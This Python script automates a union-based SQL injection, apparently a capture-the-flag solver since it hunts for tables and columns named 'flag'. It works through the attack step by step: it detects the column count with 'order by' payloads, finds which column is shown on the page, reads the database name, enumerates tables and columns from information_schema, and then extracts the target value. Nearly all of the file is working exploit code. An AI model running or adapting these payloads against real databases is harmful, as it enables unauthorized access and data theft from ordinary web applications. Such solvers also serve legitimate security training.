
import re
from utils import send

# === Step 1: Find number of columns ===
def find_column_count(max_columns=15):
    print("[*] Detecting Column Count...")
    for i in range(1, max_columns + 1):
        payload = f"-1 order by {i}--"
        html = send(payload)
        if "error" in html.lower():
            print(f"[+] Columns found: {i-1}")
            return i - 1
    return None

# === Step 2: Find visible column ===
def find_visible_column(total):
    print("[*] Finding visible column...")
    for i in range(1, total + 1):
        test = ["null"] * total
        test[i - 1] = '"Visible"'
        payload = f"-1 union select {','.join(test)}--"
        html = send(payload)
        if "Visible" in html:
            print (f"[+] Visible column: {i}")
            return i
    return None

# === Step 3: Get database name ===
def get_database(total, visible):
    cols =["null"] * total
    cols[visible - 1] = "database()"
    payload = f"-1 union select {','.join(cols)}--"
    print("[+] Database Name:")
    print(send(payload))

# === Step 4: Get table names ===
def get_tables(total, visible):
    cols = [str(i) for i in range(1, total + 1)]
    cols[visible - 1] = "(select group_concat(table_name) from information_schema.tables where table_schema=database())"
    s = ','.join(cols)
    payload = f"-1 union select {s}--"
    print("[+] Tables in DB:")
    
    tables_html = send(payload)

    table_names = re.findall(r'\bflag\w*\b', tables_html, re.IGNORECASE)
    
    if not table_names:
        print("[-] No flag-like table found.")
        return

    table = table_names[0]
    print(f"[+] Found suspicious table: {table}")
    return table

# === Step 5: Get column names of flag table ===
def get_columns(total, visible, table): 
    print("[*] Enumerating columns in that table...")
    cols = ["null"] * total
    cols[visible - 1] = f"(select group_concat(column_name) from information_schema.columns where table_name='{table}')"
    payload = f"-1 union select {','.join(cols)}--"
    print(f"[+] Columns in table {table}:")
    columns_html = send(payload)
    column_names = re.findall(r'\bflag\w*\b', columns_html, re.IGNORECASE)

    if not column_names:
        print("[-] No flag-like column found.")
        return
    
    column = column_names[0]
    print(f"[+] Found suspicious column: {column}")
    return column

# === Step 6: Get flag ===
def get_flag(total, visible, table, column):
    print("[*] Extracting flag...")
    cols = ["null"] * total
    cols[visible - 1] = f"(select {column} from {table})"
    payload = f"-1 union select {','.join(cols)}--"
    flags_html = send(payload)
    flag_vals = re.findall(r'\bflag\w*\b', flags_html, re.IGNORECASE)
    flag = flag_vals[0]
    print(f"[+] FLAG: {flag} 🎯")
    return flag